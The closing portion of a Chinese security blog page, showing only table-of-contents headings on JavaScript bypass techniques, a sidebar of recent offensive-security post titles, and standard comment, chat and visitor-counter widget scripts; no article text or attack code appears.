class="toc-text">某全球顶级网络设备商</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%90%E5%85%A8%E7%90%83%E6%9C%80%E5%A4%A7%E7%9A%84%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0"><span class="toc-number">2.2.</span> <span class="toc-text">某全球最大的在线学习平台</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reflect-apply-%E5%8F%8D%E5%B0%84%E8%B0%83%E7%94%A8"><span class="toc-number">2.3.</span> <span class="toc-text">Reflect.apply 反射调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Object-defineProperty-%E5%8A%A8%E6%80%81%E5%AE%9A%E4%B9%89"><span class="toc-number">2.4.</span> <span class="toc-text">Object.defineProperty 动态定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#String-fromCharCode-%E6%8B%BC%E6%8E%A5%E5%87%BD%E6%95%B0%E5%90%8D"><span class="toc-number">2.5.</span> <span class="toc-text">String.fromCharCode 拼接函数名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87"><span class="toc-number">2.6.</span> <span class="toc-text">&lt;iframe&gt; 沙盒绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Event-%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0"><span class="toc-number">2.7.</span> <span class="toc-text">Event 事件处理函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Array-map-%E9%9A%90%E5%BC%8F%E8%B0%83%E7%94%A8"><span class="toc-number">2.8.</span> <span class="toc-text">Array.map 隐式调用</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/12/01/JS%E9%80%86%E5%90%91-%E7%A0%81%E4%B8%8A%E7%88%AC%E9%A2%98%E8%A7%A3/" title="JS逆向- 0基础JS逆向练习题解"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/18.jpg'" alt="JS逆向- 0基础JS逆向练习题解"/></a><div class="content"><a class="title" href="/2025/12/01/JS%E9%80%86%E5%90%91-%E7%A0%81%E4%B8%8A%E7%88%AC%E9%A2%98%E8%A7%A3/" title="JS逆向- 0基础JS逆向练习题解">JS逆向- 0基础JS逆向练习题解</a><time datetime="2025-12-01T13:51:03.000Z" title="发表于 2025-12-01 21:51:03">2025-12-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/14/%E5%AE%9E%E6%88%98URL%E6%A0%A1%E9%AA%8Cbypass-%E6%B5%85%E8%B0%88%E9%9D%99%E6%80%81DNS%E8%A7%A3%E6%9E%90%E5%A7%BF%E5%8A%BF%E4%B8%8ECAS%E7%A5%A8%E6%8D%AE%E5%8A%AB%E6%8C%81%E6%A1%88%E4%BE%8B/" title="实战URL校验bypass:浅谈静态DNS解析姿势与CAS票据劫持案例"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/18.jpg'" alt="实战URL校验bypass:浅谈静态DNS解析姿势与CAS票据劫持案例"/></a><div class="content"><a class="title" href="/2025/06/14/%E5%AE%9E%E6%88%98URL%E6%A0%A1%E9%AA%8Cbypass-%E6%B5%85%E8%B0%88%E9%9D%99%E6%80%81DNS%E8%A7%A3%E6%9E%90%E5%A7%BF%E5%8A%BF%E4%B8%8ECAS%E7%A5%A8%E6%8D%AE%E5%8A%AB%E6%8C%81%E6%A1%88%E4%BE%8B/" title="实战URL校验bypass:浅谈静态DNS解析姿势与CAS票据劫持案例">实战URL校验bypass:浅谈静态DNS解析姿势与CAS票据劫持案例</a><time datetime="2025-06-14T04:29:52.000Z" title="发表于 2025-06-14 12:29:52">2025-06-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/12/%E4%BB%8EXSS%E5%88%B0RCE%E7%9A%84PC%E7%AB%AF%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E5%BB%BA/" title="从XSS到RCE的PC端利用链构建"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/18.jpg'" alt="从XSS到RCE的PC端利用链构建"/></a><div class="content"><a class="title" href="/2025/06/12/%E4%BB%8EXSS%E5%88%B0RCE%E7%9A%84PC%E7%AB%AF%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E5%BB%BA/" title="从XSS到RCE的PC端利用链构建">从XSS到RCE的PC端利用链构建</a><time datetime="2025-06-12T04:49:36.000Z" title="发表于 2025-06-12 12:49:36">2025-06-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/05/12/%E4%BB%8E%E7%99%BB%E5%BD%95%E5%B0%81%E9%94%81%E5%88%B0%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91%E6%B2%A6%E9%99%B7%E6%95%B4%E4%B8%AAC%E6%AE%B5/" title="从登录封锁到打穿内网沦陷整个C段"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/18.jpg'" alt="从登录封锁到打穿内网沦陷整个C段"/></a><div class="content"><a class="title" href="/2025/05/12/%E4%BB%8E%E7%99%BB%E5%BD%95%E5%B0%81%E9%94%81%E5%88%B0%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91%E6%B2%A6%E9%99%B7%E6%95%B4%E4%B8%AAC%E6%AE%B5/" title="从登录封锁到打穿内网沦陷整个C段">从登录封锁到打穿内网沦陷整个C段</a><time datetime="2025-05-12T05:42:02.000Z" title="发表于 2025-05-12 13:42:02">2025-05-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/05/01/Elasticsearch%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" title="Elasticsearch未授权访问"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/18.jpg'" alt="Elasticsearch未授权访问"/></a><div class="content"><a class="title" href="/2025/05/01/Elasticsearch%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" title="Elasticsearch未授权访问">Elasticsearch未授权访问</a><time datetime="2025-05-01T03:31:57.000Z" title="发表于 2025-05-01 11:31:57">2025-05-01</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/1.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By X1ly?S</div><div class="footer_custom_text">我的来时路</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><div class="js-pjax"><script>(() => {
+  let initFn = window.walineFn || null
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+  const option = null
+
+  const destroyWaline = ele => ele.destroy()
+
+  const initWaline = (Fn, el = document, path = window.location.pathname) => {
+    const waline = Fn({
+      el: el.querySelector('#waline-wrap'),
+      serverURL: 'https://comments-swart.vercel.app/',
+      pageview: false,
+      dark: 'html[data-theme="dark"]',
+      comment: true,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyWaline = () => {
+        destroyWaline(waline)
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const loadWaline = (el, path) => {
+    if (initFn) initWaline(initFn, el, path)
+    else {
+      btf.getCSS('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.css')
+        .then(() => import('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.js'))
+        .then(({ init }) => {
+          initFn = init || Waline.init
+          initWaline(initFn, el, path)
+          window.walineFn = initFn
+        })
+    }
+  }
+
+  if (isShuoshuo) {
+    'Waline' === 'Waline'
+      ? window.shuoshuoComment = { loadComment: loadWaline } 
+      : window.loadOtherComment = loadWaline
+    return
+  }
+
+  if ('Waline' === 'Waline' || !false) {
+    if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+    else setTimeout(loadWaline, 0)
+  } else {
+    window.loadOtherComment = loadWaline
+  }
+})()</script></div><script>(() => {
+  const isChatBtn = false
+  const isChatHideShow = false
+
+  if (isChatBtn) {
+    const close = () => {
+      Chatra('minimizeWidget')
+      Chatra('hide')
+    }
+
+    const open = () => {
+      Chatra('openChat', true)
+      Chatra('show')
+    }
+
+    window.ChatraSetup = { startHidden: true }
+  
+    window.chatBtnFn = () => {
+      document.getElementById('chatra').classList.contains('chatra--expanded') ? close() : open()
+    }
+  } else if (isChatHideShow) {
+    window.chatBtn = {
+      hide: () => Chatra('hide'),
+      show: () => Chatra('show')
+    }
+  }
+
+  (function(d, w, c) {
+    w.ChatraID = ''
+    var s = d.createElement('script')
+    w[c] = w[c] || function() {
+      (w[c].q = w[c].q || []).push(arguments)
+    }
+    s.async = true
+    s.src = 'https://call.chatra.io/chatra.js'
+    if (d.head) d.head.appendChild(s)
+  })(document, window, 'Chatra')
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
